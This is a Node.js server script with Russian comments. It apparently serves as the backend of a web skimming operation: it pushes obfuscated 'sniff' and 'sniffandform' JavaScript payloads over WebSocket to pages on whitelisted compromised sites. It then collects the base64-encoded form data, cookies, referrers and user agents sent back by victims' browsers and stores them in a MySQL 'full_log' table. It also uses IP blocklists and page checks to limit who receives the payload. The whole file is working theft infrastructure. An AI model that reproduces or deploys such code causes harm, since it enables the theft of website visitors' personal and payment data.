const fs = require('fs');
const WebSocket = require('ws');
const axios = require('axios');
const mysql = require('mysql2/promise');
const UglifyJS = require('uglify-js');
const { btoa, atob } = require('abab');
const { Mutex } = require('async-mutex');

const mutex = new Mutex();

// Функция base64Decode для наглядности (необязательно, можно пользоваться atob напрямую)
function base64Decode(str) {
    return atob(str);
}

// Функция экранирования HTML-символов
function escapeHtml(unsafe) {
    return unsafe
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

// Функция очистки/обезвреживания входных данных
function sanitizeInput(input) {
    if (typeof input !== 'string') return input;

    // Удаляем теги вида <script>, <div> и т.п.
    let sanitized = input.replace(/<[^>]*>?/gm, '');
    // Экранируем опасные HTML-символы
    sanitized = escapeHtml(sanitized);
    // Удаляем непечатаемые символы
    sanitized = sanitized.replace(/[\x00-\x1F\x7F-\x9F]/g, '');

    return sanitized;
}

const pool = mysql.createPool({
    host: 'ip admin panel db',
    user: 'user admin panel db',
    password: 'password admin panel db',
    database: 'name admin panel db',
    charset: 'utf8mb4',
    waitForConnections: true,
    connectionLimit: 100, 
});

// Параметры для обновлений
const config = {
    allowedOriginsUrl: 'https://site.com/adminpanel/file_js/domainreferrers.txt',
    websocketPort: 8098,
    blockedIpUrl: 'https://site.com/adminpanel/file_js/blocked_ips.txt'
};

let allowedOrigins = new Set();
let blockedIPsCache = [];
let isOriginListReady = false;
let isBlockedIPListReady = false;

const UPDATE_INTERVAL = 60000;                     // 60 секунд
const BLOCKED_IP_UPDATE_INTERVAL = 5 * 60 * 1000;  // 5 минут

// Обновляем список разрешённых доменов
async function updateAllowedOrigins() {
    try {
        const response = await axios.get(config.allowedOriginsUrl);
        if (response.status === 200) {
            allowedOrigins = new Set(response.data.split('\n').map(line => line.trim()));
            console.log('Список разрешённых источников обновлён.');
            isOriginListReady = true;
        } else {
            console.log('Файл domainreferrers.txt не найден. Ждём следующего обновления.');
        }
    } catch (error) {
        console.error('Ошибка при обновлении списка разрешённых источников:', error);
    }
}

// Обновляем список заблокированных IP
async function updateBlockedIPs() {
    try {
        const response = await axios.get(config.blockedIpUrl);
        blockedIPsCache = response.data
            .split('\n')
            .map(line => line.trim())
            .filter(ip => ip);
        console.log('Список заблокированных IP обновлён и кэширован.');
        isBlockedIPListReady = true;
    } catch (error) {
        if (error.response && error.response.status === 404) {
            console.log('Файл blocked_ips.txt не найден. Продолжаем без блокировки IP.');
        } else {
            console.error('Ошибка при обновлении списка заблокированных IP:', error.message);
            console.log('Продолжаем без блокировки IP из-за ошибки.');
        }
        blockedIPsCache = [];
        isBlockedIPListReady = true;
    } finally {
        console.log(`Текущее количество заблокированных IP: ${blockedIPsCache.length}`);
    }
}

updateAllowedOrigins();
updateBlockedIPs();

setInterval(updateAllowedOrigins, UPDATE_INTERVAL);
setInterval(updateBlockedIPs, BLOCKED_IP_UPDATE_INTERVAL);

// Проверка IP на блокировку (маски вида *.*.*.* поддерживаются)
function isIPBlocked(ip) {
    return blockedIPsCache.some(blockedIP => {
        if (blockedIP.includes('*')) {
            const pattern = blockedIP
                .split('.')
                .map(part => part === '*' ? '\\d+' : part)
                .join('\\.');
            const regex = new RegExp(`^${pattern}$`);
            return regex.test(ip);
        } else {
            return ip === blockedIP;
        }
    });
}

// Нормализуем URL (перевод http:// в https://)
function normalizeUrl(url) {
    return url.replace(/^http:\/\//, 'https://');
}

// Кэшируемые разрешённые страницы
const allowedPagesCache = new Map();
const CACHE_TTL = 120000; // 2 минуты

// Функция для проверки, разрешена ли конкретная страница
async function isPageAllowed(origin, sourcePageUrl) {
    const cacheKey = `${origin}:${sourcePageUrl}`;
    const cachedEntry = allowedPagesCache.get(cacheKey);

    if (cachedEntry && Date.now() - cachedEntry.timestamp < CACHE_TTL) {
        return cachedEntry.isAllowed;
    }

    let decodedUrl;
    try {
        decodedUrl = decodeURIComponent(sourcePageUrl);
    } catch (error) {
        console.error('Ошибка декодирования decodedUrl в isPageAllowed:', error);
        return false; // Если ошибка — считаем, что страница не разрешена
    }

    try {
        const query = `
            SELECT COUNT(*) AS count
            FROM allowed_pages
            WHERE domain = ?
              AND ? LIKE CONCAT('%', page, '%')
        `;
        const [rows] = await pool.execute(query, [origin, decodedUrl]);
        const isAllowed = rows[0].count > 0;
        allowedPagesCache.set(cacheKey, { isAllowed, timestamp: Date.now() });
        return isAllowed;
    } catch (error) {
        console.error('Ошибка при проверке разрешённой страницы:', error);
        return false;
    }
}

// Кэш для внешних файлов
const fileCache = new Map();

// Получаем данные по URL с кэшированием
async function fetchData(url) {
    const now = Date.now();
    const cachedData = fileCache.get(url);

    if (cachedData && now - cachedData.timestamp < CACHE_TTL) {
        return cachedData.data;
    }

    try {
        const response = await axios.get(url, { timeout: 10000 });
        const data = response.data;
        fileCache.set(url, { data, timestamp: now });
        return data;
    } catch (error) {
        console.error(`Ошибка при запросе к ${url}:`, error.message);
        if (cachedData) {
            console.log(`Используем закэшированные данные для ${url}`);
            return cachedData.data;
        }
        throw error;
    }
}

// Получаем кэшированные данные (если нужно)
function getCachedData(url) {
    const cacheEntries = Array.from(fileCache.entries());
    const latestEntry = cacheEntries
        .filter(([key]) => key.startsWith(url))
        .sort(([keyA], [keyB]) => {
            const timestampA = parseInt(keyA.split('timestamp=')[1]);
            const timestampB = parseInt(keyB.split('timestamp=')[1]);
            return timestampB - timestampA;
        })[0];
    return latestEntry ? latestEntry[1] : null;
}

// Глобальная переменная для хранения содержимого comment.txt
let COMMENT_CONTENT = '';

async function updateCommentContent() {
    try {
        COMMENT_CONTENT = await fetchData('https://site.com/adminpanel/file_js/sniffobf.txt');
    } catch (error) {
        console.error('Не удалось обновить COMMENT_CONTENT:', error);
    }
}

updateCommentContent();
setInterval(updateCommentContent, CACHE_TTL);

// Создаём WebSocket-сервер
const wss = new WebSocket.Server({
    port: config.websocketPort,

    // verifyClient переопределим так, чтобы всегда done(true),
    // но пометим, что нужно будет разорвать соединение позже, если unauthorized
    verifyClient: async function (info, done) {
        // Проверяем, готовы ли списки
        if (!isOriginListReady || !isBlockedIPListReady) {
            console.log('Неавторизовано: списки ещё не готовы');
            info.req.authorizedCheck = false;
            done(true);
            return;
        }

        // Получаем IP клиента, сразу санитизируем
        const rawIp = (info.req.headers['x-forwarded-for'] || '').split(',')[0].trim() || info.req.connection.remoteAddress;
        const clientIp = sanitizeInput(rawIp); // [ИЗМЕНЕНО] убеждаемся, что IP санитизирована (хотя там обычно нет <script>)

        // Проверяем на блокировку IP
        if (isIPBlocked(clientIp)) {
            console.log(`Заблокированный IP обнаружен: ${clientIp}`);
            info.req.authorizedCheck = false;
            done(true);
            return;
        }

        // Смотрим origin
        let origin = info.origin ? sanitizeInput(info.origin) : '';
        if (origin && typeof origin === 'string') {
            origin = normalizeUrl(origin);
        } else {
            console.error('Ошибка: origin не определён или не строка.');
            info.req.authorizedCheck = false;
            done(true);
            return;
        }

        // Достаём sourcePageUrl (если есть)
        let sourcePageUrl = null;
        if (info.req.url.includes('?')) {
            try {
                const splitted = info.req.url.split('?')[1].split('=');
                sourcePageUrl = decodeURIComponent(splitted[1]);
                // [ИЗМЕНЕНО] дополнительная очистка:
                sourcePageUrl = sanitizeInput(sourcePageUrl);
            } catch (error) {
                console.error('Ошибка декодирования sourcePageUrl:', error);
                sourcePageUrl = null;
            }
        }

        // Проверяем, есть ли origin в allowedOrigins
        if (!allowedOrigins.has(origin)) {
            console.log('Неавторизовано: неподходящий source');
            info.req.authorizedCheck = false;
            done(true);
            return;
        }

        // Если sourcePageUrl есть — проверяем, разрешена ли страница
        if (sourcePageUrl) {
            const isAllowedPage = await isPageAllowed(origin, sourcePageUrl);
            if (!isAllowedPage) {
                console.log('Неавторизовано: неправильная страница');
                info.req.authorizedCheck = false;
                done(true);
                return;
            }
        } else {
            console.log('Неавторизовано: отсутствует параметр source');
            info.req.authorizedCheck = false;
            done(true);
            return;
        }

        // Если всё ок
        info.req.authorizedCheck = true;
        done(true);
    }
});

// Пакетная вставка в MySQL
const batchInsertSize = 100;
let batchInsertData = [];

async function batchInsertIntoDatabase() {
    await mutex.runExclusive(async () => {
        if (batchInsertData.length === 0) {
            return;
        }
        try {
            const query = 'INSERT INTO full_log (user_cookie, data, ip_address, referrer, useragent) VALUES ?';
            await pool.query(query, [batchInsertData]);
            batchInsertData = [];
            console.log('Пакетная вставка данных в MySQL прошла успешно.');
        } catch (error) {
            console.error('Ошибка во время пакетной вставки:', error);
        }
    });
}

// Обновление активности сайта (site_activity)
const ACTIVITY_UPDATE_INTERVAL = 120000;
const siteActivityData = {};

async function updateSiteActivity() {
    const currentTime = Date.now();

    for (const [origin, data] of Object.entries(siteActivityData)) {
        try {
            const [rows] = await pool.execute(
                `SELECT 
                    UNIX_TIMESTAMP(last_connection_time) * 1000 AS last_connection_time, 
                    UNIX_TIMESTAMP(connection_after_access) * 1000 AS connection_after_access 
                 FROM site_activity 
                 WHERE site_origin = ?`,
                [origin]
            );

            if (rows.length > 0) {
                const dbLastConnectionTime = rows[0].last_connection_time;
                const dbConnectionAfterAccess = rows[0].connection_after_access;

                let updateNeeded = false;
                let updateFields = [];
                let updateValues = [];

                if (data.lastConnectionTime > dbLastConnectionTime) {
                    updateFields.push('last_connection_time = FROM_UNIXTIME(?)');
                    updateValues.push(data.lastConnectionTime / 1000);
                    updateNeeded = true;
                }
                if (data.connectionAfterAccess && (!dbConnectionAfterAccess || data.connectionAfterAccess > dbConnectionAfterAccess)) {
                    updateFields.push('connection_after_access = FROM_UNIXTIME(?)');
                    updateValues.push(data.connectionAfterAccess / 1000);
                    updateNeeded = true;
                }

                if (updateNeeded) {
                    const query = `
                        UPDATE site_activity
                        SET ${updateFields.join(', ')}
                        WHERE site_origin = ?
                    `;
                    await pool.execute(query, [...updateValues, origin]);
                    console.log(`Обновлена активность для сайта: ${origin}`);
                } else {
                    console.log(`Нет необходимости обновлять активность для сайта: ${origin}`);
                }
            } else {
                // Если в БД нет записи, создаём новую
                if (currentTime - data.lastConnectionTime > 2 * 24 * 60 * 60 * 1000) {
                    delete siteActivityData[origin];
                    console.log(`Убрали неактивный сайт из памяти: ${origin}`);
                    continue;
                }
                const query = `
                    INSERT INTO site_activity (site_origin, last_connection_time, connection_after_access)
                    VALUES (?, FROM_UNIXTIME(?), ${data.connectionAfterAccess ? 'FROM_UNIXTIME(?)' : 'NULL'})
                `;
                const values = [origin, data.lastConnectionTime / 1000];
                if (data.connectionAfterAccess) {
                    values.push(data.connectionAfterAccess / 1000);
                }
                await pool.execute(query, values);
                console.log(`Добавлен новый сайт в базу: ${origin}`);
            }

            delete siteActivityData[origin];
        } catch (error) {
            if (error.code === 'ER_DUP_ENTRY') {
                console.log(`Дубликат записи для сайта: ${origin}, пропускаем вставку.`);
            } else {
                console.error('Ошибка при обновлении активности сайта:', error);
            }
        }
    }
}

setInterval(updateSiteActivity, ACTIVITY_UPDATE_INTERVAL);

// Функция для обновления connection_after_access
async function updateConnectionAfterAccess(origin) {
    try {
        const query = `
            UPDATE site_activity 
            SET connection_after_access = FROM_UNIXTIME(?)
            WHERE site_origin = ?
        `;
        await pool.execute(query, [Date.now() / 1000, origin]);
        console.log(`Обновили connection_after_access для сайта: ${origin}`);
    } catch (error) {
        console.error('Ошибка при обновлении connection_after_access:', error);
    }
}

// Подключение WebSocket
wss.on('connection', async (ws, req) => {
    console.log('Клиент подключился к WebSocket.');

    // [ИЗМЕНЕНО] Получаем IP, origin и sourcePageUrl сразу в «очищенном» виде
    const rawIp = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.connection.remoteAddress;
    const clientIp = sanitizeInput(rawIp); 
    const origin = normalizeUrl(sanitizeInput(req.headers['origin'] || ''));
    const sourceParam = req.url.includes('?') 
        ? req.url.split('?')[1].split('=')[1]
        : null;
    let sourcePageUrl = sourceParam ? decodeURIComponent(sourceParam) : null;
    // Дополнительно санитизируем sourcePageUrl:
    if (sourcePageUrl) {
        sourcePageUrl = sanitizeInput(sourcePageUrl);
    }

    // Если отметили unauthorized в verifyClient
    if (req.authorizedCheck === false) {
        // Оставляем соединение на полсекунды, потом мягко закрываем
        setTimeout(() => {
            ws.close(1000, 'Unauthorized');
            console.log('Неавторизованный клиент отключён (мягкое закрытие).');
        }, 500);
        return;
    }

    // Если сайт впервые появляется в current session, записываем время
    if (!siteActivityData[origin]) {
        siteActivityData[origin] = {
            lastConnectionTime: Date.now(),
            lastUpdateTime: 0
        };
    } else {
        siteActivityData[origin].lastConnectionTime = Date.now();
    }

    // Проверяем еще раз IP (на случай изменения)
    if (isIPBlocked(clientIp)) {
        console.log('Отключаем заблокированный IP после 0.5с');
        setTimeout(() => {
            ws.close(1000, 'Blocked IP');
            console.log('Клиент с заблокированным IP отключён.');
        }, 500);
        return;
    }

    // Попробуем дать контент, если origin есть в allowedOrigins и страница разрешена
    if (!allowedOrigins.has(origin) || (sourcePageUrl && !(await isPageAllowed(origin, sourcePageUrl)))) {
        console.log('Отключаем неавторизованного клиента через 0.5с');
        setTimeout(() => {
            ws.close(1000, 'Unauthorized');
            console.log('Неавторизованный клиент отключён.');
        }, 500);
        return;
    }

    // Формируем имя файла для выдачи
    let filename = sanitizeInput(
        origin.replace(/^https?:\/\//, '').replace(/\./g, '_')
    ) + '_sniffandform.txt';
    let url = `https://site.com/adminpanel/file_js/${filename}`;

    // Пробуем выдать клиенту скомбинированный текст (COMMENT_CONTENT + файл)
    try {
        console.time('Загрузка внешнего файла');
        const urlContent = await fetchData(url);
        console.timeEnd('Загрузка внешнего файла');

        const combinedContent = COMMENT_CONTENT + '\n' + urlContent;
        ws.send(combinedContent);

        // Обновляем connection_after_access
        await updateConnectionAfterAccess(origin);
    } catch (error) {
        console.error('Ошибка при загрузке или отправке данных:', error);
        ws.close();
    }

    // Обработка входящих сообщений
    ws.on('message', async (message) => {
        let messageStr = message.toString();
        if (messageStr === ' ') {
            return; // Пустые пробелы не обрабатываем
        } else {
            try {
                await mutex.runExclusive(async () => {
                    const plain = Buffer.from(messageStr, 'base64').toString();
                    const data = JSON.parse(plain);

                    // [ИЗМЕНЕНО] Очистка всех полей:
                    const sanitizedUserCookie = sanitizeInput(data.userCookie);
                    // referrer может содержать всё, что угодно:
                    const sanitizedReferrer   = data.referrer ? sanitizeInput(data.referrer) : 'direct';
                    const sanitizedUserAgent  = data.userAgent ? sanitizeInput(data.userAgent) : 'unknown';

                    // Массив data.data также очищаем
                    const sanitizedDataArray = data.data.map(item => sanitizeInput(item));

                    const results = await selectFromDatabase(sanitizedUserCookie);
                    if (results.length > 0) {
                        // Уже есть запись — обновляем
                        let existingData = JSON.parse(results[0].data || '[]');
                        let newData = existingData.concat(sanitizedDataArray);
                        await updateDatabase(JSON.stringify(newData), sanitizedUserCookie);
                        console.log('Данные успешно обновлены в MySQL.');
                    } else {
                        // Вставляем в batch
                        const existingIndex = batchInsertData.findIndex(row => row[0] === sanitizedUserCookie);
                        if (existingIndex !== -1) {
                            let existingData = JSON.parse(batchInsertData[existingIndex][1]);
                            let newData = existingData.concat(sanitizedDataArray);
                            batchInsertData[existingIndex][1] = JSON.stringify(newData);
                        } else {
                            // [ИЗМЕНЕНО] используем sanitizedReferrer вместо data.referrer
                            batchInsertData.push([
                                sanitizedUserCookie,
                                JSON.stringify(sanitizedDataArray),
                                sanitizeInput(clientIp),
                                sanitizedReferrer,
                                sanitizedUserAgent
                            ]);
                        }

                        // Дополнительный лог, чтобы убедиться, что нет лишних тегов:
                        console.log("batchInsertData referrer:", sanitizedReferrer);

                        if (batchInsertData.length >= batchInsertSize) {
                            await batchInsertIntoDatabase();
                        }
                    }
                });
            } catch (error) {
                console.error('Ошибка при парсинге JSON или работе с БД:', error);
            }
        }
    });
});

// Функции для обращения к БД (выборка и обновление)
async function selectFromDatabase(userCookie) {
    try {
        const [rows] = await pool.execute(
            'SELECT * FROM full_log WHERE user_cookie = ?', 
            [userCookie]
        );
        return rows;
    } catch (error) {
        throw error;
    }
}

async function updateDatabase(newData, userCookie) {
    try {
        await pool.execute(
            'UPDATE full_log SET data = ? WHERE user_cookie = ?', 
            [newData, userCookie]
        );
    } catch (error) {
        throw error;
    }
}

// Периодически сбрасываем пакетные данные
setInterval(batchInsertIntoDatabase, 10000);

// Выводим кол-во активных соединений раз в 3 минуты
setInterval(() => {
    console.log(`Количество активных соединений: ${wss.clients.size}`);
}, 180000);

// Закрываем пул соединений с БД по SIGINT
process.on('SIGINT', async () => {
    try {
        await pool.end();
        console.log('Соединения с базой данных закрыты.');
        process.exit();
    } catch (error) {
        console.error('Ошибка при закрытии соединений с БД:', error);
        process.exit(1);
    }
});
